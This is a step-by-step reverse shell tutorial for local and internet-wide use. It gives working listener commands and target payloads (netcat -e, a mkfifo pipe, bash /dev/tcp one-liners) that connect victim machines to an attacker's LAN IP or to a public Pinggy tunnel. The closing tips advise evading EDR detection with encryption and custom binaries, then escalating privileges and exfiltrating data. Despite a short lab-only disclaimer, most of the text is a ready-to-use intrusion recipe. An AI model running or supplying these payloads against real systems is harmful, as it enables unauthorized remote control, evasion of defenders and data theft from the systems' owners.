# Reverse Shell Setup Guide: Local vs. Global Networks (2026 Edition)

This document explains how to set up a **reverse shell** — a technique where the target (victim) machine initiates a connection back to the attacker (server) machine, providing remote shell access. This is commonly used in penetration testing, CTFs, and red teaming. We'll cover the basics of how the server and target connect, with step-by-step instructions.

**Important Safety Note**: This is for educational/lab purposes only. Do not use on unauthorized systems. Always test in a controlled environment (e.g., VMs on your own network).

We'll separate instructions into **Local Network** (same LAN, like home Wi-Fi) and **Global Network** (over the internet, different locations).

## Key Concepts Before Starting
- **Reverse Shell vs. Bind Shell**: In a reverse shell, the target connects *out* to the server (bypasses firewalls/NAT). In a bind shell, the server connects *in* to the target (often blocked).
- **How Connection Works**:
  1. Server starts a listener (e.g., on port 4444) waiting for incoming connections.
  2. Target runs a payload that creates an outgoing TCP connection to the server's IP/port.
  3. Once connected, the target executes a shell (e.g., /bin/bash) and pipes input/output over the connection.
  4. Server gets interactive shell access to the target.
- **Tools Needed**: nc (netcat), socat (optional for better shells), or built-ins like bash. For global, tunneling tools like Pinggy or ngrok.
- **Assumptions**: You're using Linux (Kali for server, any Linux for target). Adapt for Windows (use PowerShell equivalents).

## Section 1: Local Network Setup (Same LAN, e.g., Home Wi-Fi)
Local setups are simple because both machines share the same network — no NAT/router issues for inbound connections. Use private IPs like 192.168.1.x.

### Step 1: Prepare the Server (Attacker Machine)
- Find your local IP: Run `ip a` or `ifconfig` — look for inet addr (e.g., 192.168.1.5).
- Start the listener in a terminal:
  ```bash
  nc -lvnp 4444   # Simple nc listener on port 4444
  ```
  - Or socat for better interactivity:
    ```bash
    socat file:`tty`,raw,echo=0 tcp-listen:4444,reuseaddr
    ```
- Output: "listening on [any] 4444 ..."

### Step 2: Prepare the Target (Victim Machine)
- Ensure you have command execution on the target (e.g., via exploit, RCE, or test shell).
- Run the payload using your server's local IP (e.g., 192.168.1.5) and port (4444).

### Step 3: Execute the Payload on Target and Connect
- Basic nc payload (if nc supports -e on target):
  ```bash
  nc 192.168.1.5 4444 -e /bin/bash
  ```
- Reliable fallback (no -e needed):
  ```bash
  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.5 4444 >/tmp/f
  ```
- Pure bash (no nc required):
  ```bash
  bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
  ```
- On server: You'll see a connection (e.g., "connect to ...") and a shell prompt. Type commands like `whoami`.

### Step 4: Stabilize the Shell (Optional but Recommended)
- In the shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- Ctrl+Z, then: `stty raw -echo; fg` → Enter → `reset` → `export TERM=xterm`

### Troubleshooting Local
- No connection: Check firewall (disable ufw/firewalld temporarily). Ping server IP from target.
- Shell unstable: Use socat on both sides.

## Section 2: Global Network Setup (Over Internet, Different Locations)
Global setups are trickier due to NAT/routers/firewalls blocking inbound connections to your server. Use tunneling tools (e.g., Pinggy) to create a public endpoint that forwards to your local listener.

### Step 1: Prepare the Server (Attacker Machine)
- You need a public forwarding service since your home IP is private.
- Use Pinggy (free, no signup — best for 2026 quick tests):
  - In a terminal: 
    ```bash
    ssh -p 443 -o StrictHostKeyChecking=no -R0:localhost:4444 tcp@a.pinggy.io
    ```
  - Password prompt: Press Enter (blank).
  - Output: e.g., `tcp://randomstring.a.free.pinggy.link:54321` → This is your public host/port.
  - Keep this terminal open.
- Start listener in another terminal:
  ```bash
  nc -lvnp 4444
  ```

### Step 2: Prepare the Target (Victim Machine)
- Same as local — ensure command execution.
- Use the **public host/port** from Pinggy (not local IP).

### Step 3: Execute the Payload on Target and Connect
- Basic nc payload:
  ```bash
  nc randomstring.a.free.pinggy.link 54321 -e /bin/bash
  ```
- Reliable fallback:
  ```bash
  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc randomstring.a.free.pinggy.link 54321 >/tmp/f
  ```
- Pure bash:
  ```bash
  bash -i >& /dev/tcp/randomstring.a.free.pinggy.link/54321 0>&1
  ```
- On server: Connection appears in nc terminal → shell access.

### Step 4: Stabilize the Shell
- Same as local: Use python pty spawn, stty, etc.

### Troubleshooting Global
- No connection: Test from target `nc -zv public-host port` — should succeed. Restart Pinggy for new address if timed out.
- Network blocks: Use port 443 in Pinggy (`-R0:localhost:443`) to mimic HTTPS.
- Alternatives to Pinggy: ngrok (requires free account + card verification), bore (download binary: `./bore local 4444 --to bore.pub`).

## Final Tips
- **Security**: Use encrypted variants (e.g., socat with OPENSSL) in real scenarios to avoid detection.
- **Testing**: Set up two VMs — one server, one target.
- **Next Steps**: Once connected, enumerate (id, sudo -l), escalate privileges, exfil data.
- **Detection**: Modern EDRs catch basic nc — use custom Go/Rust binaries for stealth.

This guide keeps it simple yet effective. Practice locally first before global! If issues, check logs/firewalls. 😈
